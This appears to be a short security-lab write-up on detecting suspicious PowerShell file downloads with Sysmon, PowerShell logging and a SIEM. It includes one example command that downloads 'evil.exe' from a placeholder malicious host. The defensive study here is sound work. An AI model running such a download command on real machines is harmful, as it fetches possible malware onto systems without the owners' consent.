# Hint 07: Suspicious File Download

## Objective

Detect suspicious file downloads via PowerShell and other scripting methods.

## Steps Taken

- Used PowerShell to download a file:
  ```powershell
  Invoke-WebRequest -Uri "http://malicious-url" -OutFile "evil.exe"
  ```
- Enabled PowerShell logging (ModuleLogging, ScriptBlockLogging).

## Logs & Evidence

- Sysmon Event ID 1 (Process Create) for PowerShell.
- Sysmon Event ID 3 (Network Connection) to remote server.
- PowerShell logs captured command line.
- See: `logs/sysmon_logs_hint7.evtx`
- Screenshot: `screenshots/hint07_suspicious_file_download.png`

## Detection & Analysis

- SIEM flagged file download from non-whitelisted domain.
- Correlated process and network activity.

## Lessons Learned

- PowerShell logging is essential for modern attack detection.
- Block unauthorized script execution and monitor outbound connections.
